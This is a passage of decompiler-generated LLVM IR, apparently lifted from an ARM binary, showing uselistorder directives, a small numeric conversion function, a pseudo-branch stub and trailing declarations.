1305, 41, 39, 44, 42, 43, 40, 45, 268, 477, 738, 87, 88, 739, 100, 1117, 1118, 1120, 1121, 581, 1122, 1123, 1124, 500, 742, 741, 740, 411, 410, 414, 412, 413, 415, 1203, 1204, 1205, 743, 273, 275, 274, 276, 270, 269, 271, 272, 744, 1084, 1085, 1086, 746, 745, 277, 278, 1206, 748, 747, 294, 296, 295, 299, 297, 298, 519, 549, 751, 750, 749, 582, 1066, 752, 143, 1060, 1061, 1062, 1063, 1064, 583, 753, 46, 47, 48, 50, 49, 584, 51, 971, 754, 181, 585, 755, 323, 542, 586, 756, 103, 101, 102, 757, 117, 116, 115, 758, 224, 223, 759, 217, 760, 106, 105, 761, 215, 216, 762, 129, 763, 111, 110, 764, 350, 765, 230, 766, 326, 767, 768, 339, 340, 520, 587, 588, 589, 590, 1011, 769, 312, 1360, 591, 1361, 592, 770, 123, 118, 124, 121, 119, 125, 122, 126, 120, 130, 593, 330, 329, 771, 348, 349, 86, 1251, 1252, 774, 773, 772, 128, 160, 478, 972, 973, 974, 775, 1012, 778, 777, 776, 345, 779, 486, 1087, 487, 1088, 1089, 479, 1090, 439, 440, 438, 441, 442, 437, 443, 1091, 488, 975, 75, 78, 77, 76, 79, 1021, 521, 522, 1022, 781, 780, 83, 81, 80, 84, 85, 82, 782, 70, 72, 68, 66, 67, 69, 71, 783, 57, 784, 785, 183, 184, 786, 178, 787, 1362, 523, 594, 789, 788, 790, 331, 1255, 1258, 1259, 1260, 791, 385, 390, 391, 389, 388, 392, 386, 387, 1261, 1262, 1263, 1264, 792, 401, 407, 400, 406, 405, 399, 409, 408, 403, 397, 402, 398, 404, 1256, 1257, 595, 793, 316, 315, 317, 1265, 1266, 1267, 1268, 1269, 1270, 543, 1271, 1272, 1273, 1274, 1275, 1276, 1277, 1278, 597, 1279, 1280, 1281, 1282, 1283, 596, 1284, 1285, 1286, 1287, 1288, 794, 147, 149, 145, 148, 153, 155, 150, 154, 156, 151, 152, 146, 158, 157, 598, 599, 1010, 482, 798, 797, 796, 795, 187, 58, 501, 347, 799, 322, 321, 346, 800, 300, 801, 229, 802, 192, 191, 803, 342, 341, 804, 182, 59, 805, 806, 1307, 1308, 808, 807, 445, 446, 1119, 809, 1312, 1313, 3, 52, 1207, 1208, 810, 447, 502, 1346, 1166, 1167, 1168, 1169, 1170, 1171, 1172, 1173, 1174, 1175, 1176, 1177, 1178, 1179, 1180, 1181, 1182, 1183, 811, 197, 195, 196, 198, 199, 1319, 1320, 55, 56, 1013, 1014, 1015, 1016, 54, 53, 503, 1209, 1321, 1322, 1323, 1324, 1325, 1326, 1327, 318, 1103, 1102, 1328, 1329, 976, 977, 978, 979, 980, 981, 982, 1363, 11, 12, 13, 60, 600, 812, 537, 1210, 1211, 602, 1212, 1213, 1214, 1215, 1216, 603, 1217, 1218, 1219, 1220, 1221, 604, 1223, 525, 524, 1222, 601, 1224, 1225, 605, 1226, 1227, 1228, 817, 655, 816, 815, 814, 813, 282, 280, 281, 285, 289, 279, 286, 287, 283, 288, 284, 1229, 818, 358, 361, 360, 362, 357, 359, 504, 819, 112, 113, 1230, 1231, 1232, 290, 291, 292, 293, 538, 470, 1234, 1235, 489, 1236, 1237, 4, 5, 1238, 1240, 472, 1241, 607, 1242, 490, 1239, 606, 829, 828, 827, 826, 825, 824, 823, 822, 821, 820, 332, 333, 334, 608, 505, 830, 107, 108, 109, 1233, 550, 648, 831, 421, 609, 983, 526, 833, 832, 834, 835, 228, 227, 836, 144, 252, 837, 207, 838, 444, 839, 344, 343, 177, 176, 180, 179, 840, 255, 254, 841, 256, 842, 843, 235, 234, 844, 203, 236, 845, 314, 313, 846, 384, 204, 847, 848, 325, 324, 849, 161, 850, 328, 327, 467, 1306, 984, 473, 491, 985, 986, 987, 468, 612, 988, 989, 990, 544, 991, 992, 993, 994, 610, 611, 545, 613, 856, 855, 854, 853, 852, 851, 995, 996, 863, 862, 861, 860, 859, 649, 858, 857, 614, 997, 998, 865, 864, 999, 1000, 615, 866, 1001, 869, 868, 867, 1006, 1007, 616, 875, 874, 873, 872, 871, 870, 253, 104, 1009, 617, 878, 877, 876, 1017, 880, 879, 220, 221, 1023, 618, 1018, 1019, 620, 1020, 619, 952, 1024, 889, 888, 887, 886, 885, 884, 883, 882, 881, 219, 218, 558, 1025, 890, 893, 892, 891, 6, 621, 532, 1026, 895, 894, 551, 1027, 622, 623, 1029, 1028, 624, 898, 897, 896, 559, 1030, 1031, 625, 626, 627, 1309, 650, 1032, 628, 899, 552, 629, 630, 1033, 631, 1034, 907, 906, 905, 904, 903, 902, 901, 900, 553, 554, 908, 528, 1244, 1245, 1246, 632, 474, 1247, 1248, 1249, 633, 1250, 912, 911, 910, 909, 651, 1316, 185, 1318, 913, 634, 1330, 916, 915, 914, 1331, 10, 561, 1336, 1337, 560, 1338, 1339, 562, 563, 1340, 1341, 917, 1342, 7, 8, 1344, 1343, 635, 920, 919, 918, 636, 1253, 1254, 922, 921, 925, 924, 923, 928, 927, 926, 930, 929, 1289, 1290, 637, 1291, 1292, 533, 1293, 932, 931, 546, 9, 936, 935, 934, 933, 507, 1294, 1295, 1296, 506, 1297, 1298, 1299, 638, 937, 639, 1300, 1301, 938, 14, 1302, 1303, 320, 939, 940, 942, 941, 1310, 640, 1311, 945, 944, 943, 564, 946, 565, 1314, 1315, 1317, 1008, 222, 641, 642, 643, 950, 949, 948, 947, 951 }
  uselistorder i1 false, { 32, 35, 13, 14, 11, 15, 48, 49, 50, 51, 52, 53, 8, 9, 12, 54, 10, 36, 33, 37, 38, 39, 40, 41, 3, 16, 17, 34, 1, 30, 55, 0, 21, 22, 23, 42, 18, 20, 43, 44, 45, 46, 47, 31, 2, 5, 56, 19, 24, 27, 26, 25, 28, 6, 7, 29, 4, 57, 58, 59, 60 }
  uselistorder i1* @cpsr_c, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 ()* @function_1dd64, { 1, 0 }
}

define i32 @function_1de10(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1de10:
  %v1_1de10 = icmp slt i32 %arg2, 0
  %v2_1de10 = mul i32 %arg2, 2
  br i1 %v1_1de10, label %dec_label_pc_1de44, label %dec_label_pc_1de18

dec_label_pc_1de18:                               ; preds = %dec_label_pc_1de10
  %v1_1de18 = add i32 %v2_1de10, 2097152
  %v2_1de18 = icmp ugt i32 %v2_1de10, -2097153
  br i1 %v2_1de18, label %dec_label_pc_1de4c, label %dec_label_pc_1de20

dec_label_pc_1de20:                               ; preds = %dec_label_pc_1de18
  %v6_1de18 = icmp slt i32 %v1_1de18, 0
  br i1 %v6_1de18, label %dec_label_pc_1de24, label %dec_label_pc_1de44

dec_label_pc_1de24:                               ; preds = %dec_label_pc_1de20
  %v4_1de28 = sdiv i32 %v1_1de18, 2097152
  %v5_1de28 = sub nsw i32 -993, %v4_1de28
  %v11_1de28 = icmp slt i32 %v5_1de28, 0
  br i1 %v11_1de28, label %dec_label_pc_1de54, label %dec_label_pc_1de30

dec_label_pc_1de30:                               ; preds = %dec_label_pc_1de24
  %v3_1de30 = mul i32 %arg2, 2048
  %v4_1de38 = udiv i32 %arg1, 2097152
  %v1_1de34 = or i32 %v4_1de38, %v3_1de30
  %v5_1de38 = or i32 %v1_1de34, -2147483648
  %v6_1de3c = lshr i32 %v5_1de38, %v5_1de28
  ret i32 %v6_1de3c

dec_label_pc_1de44:                               ; preds = %dec_label_pc_1de20, %dec_label_pc_1de10
  ret i32 0

dec_label_pc_1de4c:                               ; preds = %dec_label_pc_1de18
  %v4_1de4c = mul i32 %arg2, 4096
  %v5_1de4c = or i32 %v4_1de4c, %arg1
  %v7_1de4c = icmp eq i32 %v5_1de4c, 0
  br i1 %v7_1de4c, label %dec_label_pc_1de54, label %dec_label_pc_1de5c

dec_label_pc_1de54:                               ; preds = %dec_label_pc_1de4c, %dec_label_pc_1de24
  ret i32 -1

dec_label_pc_1de5c:                               ; preds = %dec_label_pc_1de4c
  ret i32 0

; uselistorder directives
  uselistorder i32 -1, { 0, 42, 275, 188, 189, 45, 46, 43, 44, 190, 47, 187, 191, 192, 193, 1, 194, 195, 2, 3, 196, 87, 197, 88, 297, 169, 299, 89, 300, 151, 301, 302, 303, 4, 90, 304, 305, 198, 199, 69, 148, 200, 157, 91, 5, 201, 315, 76, 77, 316, 202, 152, 203, 154, 204, 6, 205, 156, 155, 319, 320, 64, 65, 66, 67, 70, 78, 7, 8, 74, 276, 9, 10, 11, 93, 97, 92, 94, 145, 146, 98, 96, 95, 170, 277, 99, 309, 100, 321, 206, 322, 323, 279, 280, 281, 101, 282, 102, 283, 12, 207, 324, 325, 208, 48, 49, 326, 209, 84, 50, 210, 327, 51, 13, 52, 211, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 212, 213, 14, 214, 149, 310, 312, 215, 103, 311, 216, 71, 104, 328, 217, 218, 329, 330, 85, 79, 80, 331, 332, 333, 334, 335, 158, 105, 336, 159, 15, 186, 81, 82, 219, 337, 362, 363, 220, 171, 364, 350, 16, 53, 221, 314, 306, 172, 222, 338, 339, 173, 298, 223, 18, 17, 224, 225, 19, 284, 226, 106, 387, 107, 292, 108, 354, 75, 355, 109, 351, 110, 278, 111, 112, 369, 20, 113, 356, 357, 114, 21, 293, 22, 227, 228, 229, 230, 358, 307, 308, 174, 115, 285, 73, 231, 23, 232, 24, 233, 175, 359, 28, 234, 235, 27, 29, 360, 26, 236, 237, 54, 25, 238, 55, 56, 57, 58, 239, 240, 241, 68, 294, 295, 30, 370, 116, 318, 117, 118, 290, 119, 365, 120, 366, 121, 122, 289, 123, 317, 72, 242, 340, 185, 59, 60, 243, 244, 245, 246, 247, 86, 124, 248, 249, 184, 341, 125, 342, 250, 343, 344, 61, 345, 346, 83, 347, 251, 252, 150, 160, 153, 348, 31, 253, 176, 349, 254, 183, 62, 291, 126, 371, 127, 389, 128, 313, 129, 130, 361, 131, 286, 132, 391, 133, 296, 134, 388, 135, 368, 136, 287, 137, 367, 138, 288, 139, 140, 141, 352, 142, 390, 143, 353, 255, 256, 144, 177, 32, 33, 257, 258, 259, 34, 35, 178, 260, 261, 36, 63, 37, 38, 147, 179, 180, 181, 39, 262, 263, 264, 166, 167, 168, 40, 265, 161, 162, 163, 164, 165, 41, 266, 267, 268, 269, 270, 271, 272, 273, 274, 182 }
  uselistorder i32 4096, { 0, 1, 2, 3, 4, 22, 5, 6, 23, 7, 8, 9, 10, 24, 28, 16, 29, 27, 13, 11, 14, 32, 15, 17, 18, 25, 26, 19, 30, 20, 31, 12, 21 }
  uselistorder i32 -2147483648, { 0, 6, 1, 7, 8, 9, 10, 11, 12, 13, 14, 15, 4, 5, 16, 17, 3, 2, 18, 19, 20, 21 }
  uselistorder i32 2048, { 0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 9, 10, 15, 8 }
  uselistorder i32 2097152, { 8, 9, 15, 0, 1, 2, 10, 11, 3, 4, 5, 12, 13, 14, 6, 7 }
  uselistorder i32 2, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 190, 37, 38, 39, 162, 40, 41, 42, 43, 44, 45, 46, 191, 192, 193, 195, 196, 197, 92, 198, 47, 125, 199, 200, 201, 48, 126, 202, 203, 204, 122, 93, 127, 0, 209, 160, 163, 95, 128, 210, 129, 170, 49, 171, 211, 212, 213, 50, 214, 215, 216, 164, 205, 51, 52, 53, 206, 194, 217, 218, 219, 220, 54, 55, 96, 97, 98, 243, 244, 114, 245, 246, 99, 247, 248, 207, 165, 166, 221, 91, 222, 223, 56, 57, 224, 231, 208, 167, 130, 131, 177, 132, 178, 133, 179, 134, 180, 135, 181, 136, 58, 172, 59, 100, 60, 61, 112, 173, 62, 249, 113, 233, 63, 64, 234, 65, 66, 90, 67, 68, 69, 70, 115, 235, 236, 71, 72, 1, 168, 237, 73, 238, 232, 169, 2, 74, 101, 102, 103, 117, 104, 118, 105, 106, 137, 107, 109, 108, 110, 94, 225, 226, 123, 75, 76, 77, 78, 79, 124, 227, 119, 116, 80, 228, 229, 230, 81, 82, 83, 161, 84, 85, 86, 87, 88, 138, 174, 139, 140, 141, 142, 175, 143, 144, 120, 176, 145, 146, 148, 182, 147, 183, 149, 150, 184, 159, 151, 185, 152, 186, 187, 188, 189, 153, 242, 111, 154, 155, 156, 239, 121, 240, 89, 241, 157, 158 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_1de64() local_unnamed_addr {
entry:
  %v3_1de68 = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_1de68)
  %v31_1de70 = load i32, i32* @r0, align 4
  ret i32 %v31_1de70

; uselistorder directives
  uselistorder i32* @r0, { 71, 213, 212, 40, 37, 214, 74, 215, 5, 75, 216, 217, 73, 76, 218, 41, 38, 219, 220, 221, 222, 121, 122, 77, 223, 224, 225, 226, 227, 228, 229, 25, 230, 231, 63, 232, 233, 234, 235, 236, 65, 66, 237, 6, 238, 241, 99, 239, 240, 2, 254, 253, 47, 68, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 271, 272, 273, 284, 285, 286, 287, 288, 289, 290, 291, 102, 292, 293, 123, 124, 125, 126, 127, 294, 295, 296, 298, 297, 15, 277, 299, 300, 129, 130, 274, 100, 275, 276, 101, 64, 252, 301, 302, 303, 304, 305, 48, 16, 39, 391, 17, 59, 18, 19, 243, 3, 244, 184, 185, 186, 7, 279, 54, 278, 128, 8, 29, 346, 306, 307, 308, 103, 309, 104, 105, 310, 311, 312, 112, 313, 314, 371, 372, 373, 374, 376, 315, 56, 316, 317, 319, 320, 280, 281, 282, 283, 60, 58, 242, 245, 246, 247, 248, 249, 250, 251, 32, 45, 131, 132, 133, 43, 44, 34, 351, 392, 352, 193, 98, 394, 395, 113, 114, 115, 116, 117, 118, 119, 120, 35, 33, 134, 135, 393, 269, 270, 62, 199, 200, 201, 202, 203, 136, 137, 356, 57, 110, 111, 357, 9, 358, 359, 360, 355, 361, 362, 363, 364, 365, 386, 194, 49, 347, 55, 377, 348, 46, 321, 322, 323, 324, 50, 20, 36, 69, 379, 106, 325, 70, 326, 327, 328, 10, 11, 329, 330, 12, 14, 0, 1, 331, 332, 13, 333, 334, 335, 53, 107, 336, 337, 338, 339, 340, 52, 341, 21, 342, 343, 4, 344, 345, 138, 318, 139, 140, 187, 188, 141, 61, 210, 42, 51, 353, 67, 375, 142, 143, 144, 78, 145, 147, 146, 148, 149, 150, 151, 79, 80, 81, 152, 82, 83, 84, 85, 153, 154, 86, 155, 30, 156, 157, 158, 159, 87, 88, 89, 160, 161, 162, 28, 163, 164, 165, 24, 90, 166, 27, 23, 91, 167, 168, 169, 170, 171, 26, 22, 92, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 93, 94, 182, 183, 31, 95, 189, 190, 96, 97, 192, 195, 196, 197, 198, 204, 205, 206, 207, 208, 209, 211, 349, 350, 380, 381, 382, 384, 383, 385, 387, 388, 389, 390, 354, 108, 109, 366, 367, 368, 369, 370, 378, 191, 72 }
  uselistorder void (i32)* @__pseudo_branch, { 0, 60, 61, 62, 63, 64, 34, 35, 36, 23, 24, 25, 78, 43, 44, 45, 46, 47, 48, 49, 50, 51, 37, 38, 39, 40, 41, 42, 52, 53, 20, 21, 22, 68, 69, 65, 54, 55, 56, 57, 58, 59, 26, 27, 28, 29, 30, 31, 32, 33, 1, 2, 3, 4, 5, 6, 83, 84, 85, 86, 79, 70, 80, 81, 82, 7, 14, 15, 16, 8, 9, 10, 11, 12, 13, 17, 18, 19, 87, 88, 89, 71, 72, 73, 74, 75, 76, 90, 66, 67, 77 }
  uselistorder i32 0, {}
  uselistorder i32* @r4, { 52, 240, 15, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 53, 54, 55, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 17, 273, 16, 274, 275, 276, 277, 281, 18, 6, 306, 307, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 7, 350, 351, 352, 353, 8, 357, 365, 366, 367, 368, 369, 370, 371, 372, 19, 373, 374, 428, 393, 394, 395, 452, 453, 454, 396, 397, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 9, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 20, 22, 69, 21, 70, 71, 72, 73, 74, 475, 476, 477, 478, 481, 3, 479, 480, 12, 45, 486, 487, 482, 483, 484, 485, 13, 488, 398, 23, 399, 400, 401, 24, 402, 403, 404, 405, 406, 407, 408, 489, 490, 409, 410, 491, 492, 493, 78, 79, 80, 329, 330, 375, 376, 377, 378, 379, 380, 381, 382, 383, 25, 384, 385, 386, 387, 388, 389, 390, 391, 392, 308, 309, 310, 311, 312, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 677, 678, 429, 430, 684, 685, 282, 283, 26, 10, 284, 152, 153, 154, 155, 156, 157, 686, 687, 688, 689, 690, 691, 692, 693, 694, 695, 696, 697, 698, 699, 700, 701, 27, 411, 423, 424, 412, 413, 414, 415, 416, 420, 28, 421, 422, 418, 419, 417, 425, 426, 427, 285, 286, 287, 602, 603, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 661, 29, 662, 663, 664, 665, 666, 667, 668, 669, 594, 595, 30, 596, 597, 598, 31, 599, 32, 600, 601, 520, 521, 522, 11, 526, 0, 527, 528, 431, 432, 442, 33, 443, 34, 444, 35, 445, 446, 447, 448, 449, 450, 451, 523, 354, 355, 356, 529, 1, 313, 314, 315, 316, 278, 279, 280, 288, 289, 290, 36, 291, 292, 293, 37, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 81, 82, 83, 84, 75, 76, 77, 85, 86, 87, 14, 88, 89, 90, 91, 92, 93, 613, 614, 702, 703, 704, 611, 612, 615, 616, 167, 168, 169, 170, 171, 172, 176, 707, 712, 713, 714, 715, 716, 717, 718, 705, 94, 95, 96, 177, 178, 179, 706, 358, 38, 359, 360, 361, 362, 363, 364, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 208, 209, 210, 211, 39, 2, 212, 213, 214, 215, 216, 228, 229, 111, 112, 113, 217, 218, 219, 220, 221, 222, 107, 108, 109, 110, 114, 115, 230, 231, 232, 233, 234, 235, 708, 711, 116, 117, 118, 119, 617, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 40, 636, 637, 638, 639, 618, 619, 620, 621, 622, 623, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 47, 653, 654, 4, 655, 656, 657, 658, 659, 660, 173, 174, 175, 709, 710, 158, 159, 120, 604, 605, 606, 607, 121, 670, 671, 41, 672, 608, 5, 609, 610, 433, 434, 435, 436, 437, 438, 439, 440, 441, 530, 531, 532, 533, 42, 534, 535, 536, 537, 538, 539, 48, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 43, 589, 590, 591, 592, 593, 122, 123, 124, 574, 575, 49, 46, 576, 524, 525, 125, 126, 44, 127, 128, 162, 163, 164, 165, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 160, 161, 166, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 223, 224, 225, 226, 227, 236, 237, 238, 239, 673, 674, 675, 676, 679, 680, 681, 682, 50, 51, 683 }
}

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i16 @__decompiler_undefined_function_1() local_unnamed_addr

declare i64 @__decompiler_undefined_function_2() local_unnamed_addr

declare i8* @__decompiler_undefined_function_3() local_unnamed_addr

declare i8 @__decompiler_undefined_function_4() local_unnamed_addr

declare i16* @__decompiler_undefined_function_5() local_unnamed_addr

declare i8** @__decompiler_undefined_function_6() local_unnamed_addr

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #0

; Function Attrs: noreturn nounwind
declare void @llvm.trap() #1

declare float @fabsf(float)

attributes #0 = { nounwind readnone }
attributes #1 = { noreturn nounwind }
